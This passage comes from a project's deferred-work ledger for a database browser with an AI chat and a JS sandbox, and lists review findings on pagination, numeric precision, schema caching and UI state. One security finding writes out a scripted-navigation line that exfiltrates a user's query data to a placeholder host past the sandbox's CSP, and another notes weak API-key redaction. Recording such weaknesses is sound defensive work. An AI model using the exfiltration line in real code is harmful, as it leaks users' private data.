+reason: `isOrderable` classifies orderability by a hardcoded type-prefix denylist. For a PK-less table it either (a) filters out every column and omits `ORDER BY` entirely — so two separate page requests can return rows in different physical orders (overlap/skip, silent corrupt paging even with no concurrent writes) — or (b) passes a column that *looks* orderable but has no default ordering operator (Postgres `USER-DEFINED`/composite/`record`/`tsvector`/`pg_lsn`, `ARRAY`, or MySQL variants the prefix list misses such as `mediumblob`), so the composed `ORDER BY` throws at the DB and the whole page collapses to `internal_error` instead of degrading. Only affects keyless tables with exotic column types (PK tables order by the PK and are unaffected); the robust fix is a design decision — engine-aware orderability (which would leak ordering semantics into the driver seam), catch-and-degrade, or keyset pagination — not a mechanical widening of the prefix list. Distinct from the non-atomic COUNT/SELECT drift entry (that is concurrent-write staleness; this is a non-total page order / hard failure under zero writes).
+status: open
+
+### DW-34: Decide how a `timestamp without time zone` value should be represented in the neutral FrozenCell model — `rowsToFrozenData` stamps a UTC `Z` ISO string on every JS `Date`, so a tz-less wall-clock timestamp is displayed as though it were UTC
+
+origin: migrated from legacy ledger (code review of spec-3-2-browse-rows-pagination.md), 2026-07-12
+location: `rowsToFrozenData` / `toIsoUtc` (`frozen-map.ts`)
+reason: `frozen-map.ts` routes any `Date` through `toIsoUtc`, which serializes with a `Z`/UTC suffix. A Postgres `timestamp without time zone` (and MySQL `DATETIME`) carries no timezone, but postgres.js/mysql2 hand it back as a JS `Date`; tagging it UTC asserts a timezone the column does not have, shifting displayed times for any non-UTC-intending data. Genuine `timestamptz` round-trips correctly; the gap is representational and only visible for naive-timestamp columns. Correcting it needs a contract decision (carry a naive-vs-aware distinction, or the SQL `dataType`) rather than a one-line mapper tweak — adjacent to the deferred SQL-`dataType`-aware typing item.
+status: open
+
+### DW-35: Preserve MySQL `BIGINT` precision in the browse read path — the mysql2 connection uses default numeric handling, so a `BIGINT` above 2^53 comes back as a precision-lossy JS number and is displayed rounded
+
+origin: migrated from legacy ledger (code review of spec-3-2-browse-rows-pagination.md), 2026-07-12
+location: `driver-mysql.ts`; `naturalKind` (`frozen-map.ts`)
+reason: `driver-mysql.ts` opens the connection without `supportBigNumbers`/`bigNumberStrings`, so mysql2 decodes `BIGINT` columns to JS `number`; `frozen-map.ts` `naturalKind` then classifies the finite number as `"number"` and emits it verbatim, so a value like `9007199254740993` renders as `…992`. The mapper's bigint→string safety net only fires when the driver returns an actual `bigint`, which this config never produces for `BIGINT`. Rare (values beyond 2^53) and a driver-config/typing decision (enable big-number strings, or carry the SQL `dataType`) rather than a browse-composition bug; postgres.js already returns `int8` as a string and is unaffected.
+status: open
+
+### DW-36: Bound the FETCH (not just the display slice) for auto-classified raw reads — push a `LIMIT MAX_RESULT_ROWS + 1` or use a server cursor so a `SELECT * FROM huge_table` cannot materialize the whole result set into Core memory before the 1000-row cap applies
+
+origin: migrated from legacy ledger (code review of spec-3-1-guarded-core-executor.md), 2026-07-12
+location: `executeRaw` / `toRowsResult` (`executor.ts`)
+reason: Reviewer severity: medium. `executor.ts` `executeRaw` read path runs `runReadOnly(stmt, [])` then `toRowsResult` slices to `MAX_RESULT_ROWS` AFTER the driver (postgres.js / mysql2) has already buffered every row in memory. The Core-side cap only bounds the response payload, not the fetch, so a large read OOMs the Core process. Story 3.1 explicitly scopes DB-side pagination/`LIMIT` to Story 3.2 ("a Core-side row cap is the only responsiveness measure here"), so this is a known-limitation deferral to the pagination story, not a 3.1 defect — but the current cap gives no memory protection.
+status: open
+
+### DW-37: Make the structured `createTable` type/constraint allowlist engine-aware — postgres-only tokens (`UUID`, `JSONB`, `TIMESTAMPTZ`, `SERIAL`, …) and bare `VARCHAR` (no length) compose invalid DDL on MySQL and fail opaquely at the engine
+
+origin: migrated from legacy ledger (code review of spec-3-1-guarded-core-executor.md), 2026-07-12
+location: `CREATE_TABLE_TYPES` / `executeCreateTable` (`executor.ts`)
+reason: Reviewer severity: low. `executor.ts` `CREATE_TABLE_TYPES` is a single engine-blind allowlist; `executeCreateTable` emits the validated token verbatim. On MySQL a "valid" structured `createTable` carrying `UUID`/bare `VARCHAR` composes DDL the engine rejects → `internal_error`. Not a safety hole (values are still parameterized, identifiers quote-escaped, and it fails closed at the engine with no raw-text echo), purely a contract-quality gap; the fix is to gate/map type tokens per engine.
+status: open
+
+### DW-38: Map postgres raw-read result rows positionally (array row-mode) rather than by column name, so a `SELECT` with duplicate output column names (`SELECT id, id`, `a.id, b.id`) does not collapse same-named columns to a single (last) value
+
+origin: migrated from legacy ledger (code review of spec-3-1-guarded-core-executor.md), 2026-07-12
+location: `driver-postgres.ts` (`query`, pre-existing from Story 3.2)
+reason: Reviewer severity: low. The postgres adapter (`driver-postgres.ts`, pre-existing from Story 3.2's `query`) builds row values keyed by column name; a raw `SELECT` can produce duplicate output names, and the object-keyed mapping then shows the last value for every duplicate, losing the distinct columns' data. Invisible for Story 3.2 browse (real table columns are unique); Story 3.1 exposes it by routing arbitrary raw `SELECT`s through the same mapping. Fix: use postgres.js array/`values()` row mode and align to the ordered column metadata (mysql already uses `rowsAsArray`).
+status: open
+
+### DW-39: Document (or make configurable) the raw-SQL splitter's assumption of default session SQL modes — it assumes postgres `standard_conforming_strings = on` and MySQL default `sql_mode` (no `NO_BACKSLASH_ESCAPES`, no `ANSI_QUOTES`); non-default modes shift string/identifier boundaries
+
+origin: migrated from legacy ledger (code review of spec-3-1-guarded-core-executor.md), 2026-07-12
+location: `executor.ts` (raw-SQL splitter)
+reason: Reviewer severity: low. `executor.ts` splitter activates backslash-escaping only for mysql strings and postgres `E'…'` strings. Under postgres `standard_conforming_strings=off`, plain `'…'` strings become backslash-active → splitter over-counts (valid statement falsely rejected — fail-safe). Under MySQL `NO_BACKSLASH_ESCAPES`, `'\''` is `\` + close-quote → splitter could under-count, but this is backstopped by the now-unconditional `multipleStatements:false`. All divergences are either over-reject (safe) or backstopped, and require a non-default server session config; the durable options are to read the session settings or document the assumption. No live exploit at default configs.
+status: open
+
+### DW-40: Bind bigint/int8/numeric columns without JS `Number` precision loss on both the write value and the PK address — a value beyond `Number.MAX_SAFE_INTEGER` is silently truncated on edit/insert, and a lossy PK read makes `WHERE pk = <lossy>` address the wrong row (or none) on update/delete
+
+origin: migrated from legacy ledger (code review of spec-3-3-edit-insert-delete-rows.md), 2026-07-12
+location: `coerceValue` / `pkForRow` / `cellToValue` (`row-mutations.ts`)
+reason: Reviewer severity: high (two independent review passes flagged it as the highest-consequence item in the diff). `row-mutations.ts` `coerceValue("number")` uses `Number(raw)` and `pkForRow`/`cellToValue` read the PK from `FrozenCell` as a JS `number` (`cell.value`). The precision loss originates upstream in Story 3.2's `FrozenCell` number representation (bigint already arrives as a lossy JS number from the browse read); Story 3.3 is the first to WRITE with it, exposing a silent wrong-value / wrong-row data-corruption path with no error surfaced. Story 3.3 explicitly scopes DB-type-aware editors via `SchemaColumnInfo` out (deferred) and documents the kind-inference limitation, so the durable fix (thread column types + carry wide integers as strings/bigint across the wire) belongs with that deferred type-threading work, not the 3.3 UI.
+status: open
+
+### DW-41: Reset `createdTables` on connect/disconnect so optimistically-created tables don't accumulate across reconnects and shadow the re-introspected schema
+
+origin: migrated from legacy ledger (code review of spec-4-1-render-erd.md), 2026-07-12
+location: `src/ui/App.tsx` (`createdTables`)
+reason: `src/ui/App.tsx` only ever appends to `createdTables` (never clears it), so after a reconnect a created table appears in both `schemaTables` and `createdTables`, and after connecting to a different database a stale phantom table survives. Pre-existing Epic-3 lifecycle behavior masked by SchemaTree's dedup; the ERD's new dedup patch prevents the duplicate-id crash but the stale phantom node remains until this root cause is fixed.
+status: open
+
+### DW-42: Exclude inherited partition FK constraints (`pg_constraint.conparentid <> 0`) from the Postgres FK introspection so partitioned schemas don't render N+1 redundant edges
+
+origin: migrated from legacy ledger (code review of spec-4-1-render-erd.md), 2026-07-12
+location: `src/core/driver-postgres.ts` (FK introspection)
+reason: `src/core/driver-postgres.ts` filters only `contype='f'`; on a partitioned parent every partition carries an inherited copy of the FK, producing duplicate near-identical edges. Fix is a one-line `AND con.conparentid = 0` but carries a minor Postgres-version-compatibility consideration (conparentid exists in PG 11+), so it warrants focused attention.
+status: open
+
+### DW-43: Preserve ERD layout stability when a table is created (avoid a full dagre reshuffle of every node) — naturally addressed alongside Story 4.2 layout persistence
+
+origin: migrated from legacy ledger (code review of spec-4-1-render-erd.md), 2026-07-12
+location: `src/ui/workspace/ErdTabView.tsx`
+reason: `src/ui/workspace/ErdTabView.tsx` re-runs `schemaToGraph`+dagre whenever the `tables` identity changes, so creating a table via the Epic-3 builder jumps every node to a new position. Low severity (only pan/zoom context is preserved); best solved with the persisted-layout work in Story 4.2.
+status: open
+
+### DW-44: Decide how to signal cross-database MySQL foreign keys instead of silently dropping their edges in the ERD
+
+origin: migrated from legacy ledger (code review of spec-4-1-render-erd.md), 2026-07-12
+location: `schemaToGraph` (ERD graph builder)
+reason: When a MySQL connection names a database, columns are scoped to that schema but a FK may reference a table in another database; `schemaToGraph` then drops the edge as an "absent table" with no user indication a real relationship was omitted. Defensible for v1 but an explicit product decision (dangling-edge affordance vs. note vs. silent) is preferable.
+status: open
+
+### DW-45: `connectionManager.getSchema()` memoizes the schema at connect and never re-introspects, so chat context (and the "N tables" badge) goes stale after DDL runs (create/drop table)
+
+origin: migrated from legacy ledger (code review of spec-5-2-chat-qa-schema-only.md), 2026-07-12
+location: `src/core/connection.ts` (`getSchema`)
+severity: medium
+reason: `src/core/connection.ts` returns `cached.schema` fixed at first connect; Story 3.4/3.x DDL mutates the live DB but no re-introspection path exists. Surfaced by 5.2 which now feeds that cached schema to the AI provider.
+status: open
+
+### DW-46: Provider-key redaction in the chat error path is exact-substring only (`rawCause.split(apiKey).join("***")`), so a key echoed in a non-literal form (URL-encoded, base64, truncated, or nested in a structured error object) would still reach stderr
+
+origin: migrated from legacy ledger (code review of spec-5-4-streaming-reasoning.md), 2026-07-12
+location: `answer()` / `answerStream` (chat provider redaction path)
+severity: high
+reason: Inherited from Story 5.2's `answer()` redaction and reused verbatim by 5.4's `answerStream` (including the SDK-emitted `error`-part path). No current provider (Anthropic/OpenAI/Google) echoes the API key in error bodies, so this is latent; a stronger guarantee (redact encoded/partial forms, or emit a fixed generic cause) is preferable given the "key NEVER in any log" invariant.
+status: open
+
+### DW-47: Scripted same-frame navigation (`window.location = "http://host/?" + data`) bypasses `connect-src 'none'`, so a hostile guest can still exfiltrate the user's private `FrozenData`; the "already-public frozen data" comments understate this
+
+origin: migrated from legacy ledger (code review of spec-5-5-crossorigin-js-sandbox.md), 2026-07-12
+location: sandbox `pushData` / CSP (spec-5-5 crossorigin JS sandbox)
+severity: high
+reason: CSP fetch directives (`connect-src`, `img-src`) do not govern top-level/self navigation, and `sandbox="allow-scripts"` without `allow-top-navigation` still permits a frame to navigate ITSELF. The pushed `FrozenData` is the user's real query output, not public data. Closing this is a genuine architectural/security decision (e.g. gating `pushData` on a confirmed handshake so data never lands in a navigated-away frame, and/or a documented residual) rather than a trivial patch — the `pushData(frame, "*")` target-origin is deliberately `"*"` against the guest's opaque origin.
+status: open
+
+### DW-48: In exposed mode (`QS_HOST=0.0.0.0`) the sandbox server binds the same wildcard host as Core (LAN-exposing the tokenless guest) while the injected `__QS_SANDBOX_ORIGIN__` is normalized to `127.0.0.1:<port>`, which is unreachable for a remote browser — the sandbox silently fails to load off-host
+
+origin: migrated from legacy ledger (code review of spec-5-5-crossorigin-js-sandbox.md), 2026-07-12
+location: `startCore` (sandbox `Bun.serve`, `bindHost`); `deriveOpenUrl`
+severity: medium
+reason: `startCore` passes `bindHost` straight into the sandbox `Bun.serve`, and `deriveOpenUrl` rewrites the injected origin to loopback. The intent-contract Block-If explicitly reserves the exposure model as a human security decision, so the correct exposed-mode posture (loopback-only sandbox + documented "visualization unavailable when exposed", or a reachable remote origin) is a deliberate call, not an unattended patch.
+status: open
+
+### DW-49: The guest→host signal stream (`height`/`error`/`datum-clicked`) is unbounded in rate/count, so a hostile guest can flood `onSignal` — and via `SandboxFrame`'s `setHeight` a React re-render — thrashing the Ring 2 main thread
+
+origin: migrated from legacy ledger (code review of spec-5-5-crossorigin-js-sandbox.md), 2026-07-12
+location: `onSignal` / `SandboxFrame` (`setHeight`)
+severity: low
+reason: `isSandboxOutbound` caps `error.message` length but nothing coalesces or rate-limits frames; each valid `height` triggers `setHeight`. Best addressed when Story 5.6 wires the real renderer (debounce/coalesce height via rAF, rate-limit `onSignal`); no containment breach, but a cheap render-thrash DoS from untrusted code.
+status: open
+
+### DW-50: `SandboxFrame` binds the iframe `contentWindow` exactly once at mount; a null-at-mount window or a later guest-frame reload silently kills the channel (host never built, or the identity gate drops every subsequent message) with no rebind or diagnostic
+
+origin: migrated from legacy ledger (code review of spec-5-5-crossorigin-js-sandbox.md), 2026-07-12
+location: `SandboxFrame` (mount `useEffect`, `event.source === iframeWindow` identity gate)
+severity: low
+reason: The mount `useEffect` has empty deps and returns early if `contentWindow` is null; the host's identity gate is `event.source === iframeWindow` against that single captured window. Both fail closed (no leak) but produce a silently dead sandbox. Re-resolving `contentWindow` on the iframe `load` event and rebuilding/rebinding the host would harden it; low urgency while the component is unwired, natural to fix when 5.6 mounts it for real.
+status: open
+
+### DW-51: `SandboxFrame` documents `data: null` as "renders an empty guest", but a non-null→null transition pushes nothing, so the guest keeps displaying the prior draw — the documented empty state never happens
+
+origin: migrated from legacy ledger (code review of spec-5-5-crossorigin-js-sandbox.md), 2026-07-12
+location: `SandboxFrame.tsx:36` (contract) / `SandboxFrame.tsx:109` (`if (loaded && data !== null)`)
+severity: low
+reason: `SandboxFrame.tsx:36` promises the empty-guest behavior; `SandboxFrame.tsx:109` guards `if (loaded && data !== null)` and never clears. A correct fix (push an empty `FrozenData` that passes the guard's `decode`, or restate the contract) needs the empty-state semantics 5.6 will define, so it is deferred rather than papered over.
+status: open
+
+### DW-52: In the Live Report runtime, a `connections.list` failure at initial load leaves the top-level "cannot reach quick-studio" banner and the Default-only picker permanently stale — a later Refresh re-queries and renders live data but never re-lists connections nor clears the banner
+
+origin: migrated from legacy ledger (code review of spec-6-4-export-live-report.md), 2026-07-12
+location: `src/live-report/runtime.ts` (`runLiveReport`, `runAll`, `loadConnections`)
+severity: low
+reason: `src/live-report/runtime.ts` `runLiveReport` calls `loadConnections` once and `host.setStatus(CANNOT_REACH_HTML)` on failure; `runAll` (wired to both the picker and Refresh) only re-issues `execute` per query block — it never re-attempts `loadConnections`, clears the top-level status, nor rebuilds the picker. So recovered data is shown beneath a contradictory failure notice with named connections missing until a full page reload. Trigger is narrow (connections.list fails at load, Core recovers, viewer clicks Refresh) and data stays correct with full-reload recovery, so consequence is low/cosmetic; the correct fix is a re-entrant connection-reload + replaceable-picker refactor (must preserve the run-generation concurrency guard and the current pick), disproportionate to jam into an unattended follow-up review — deferred for focused attention.
+status: open
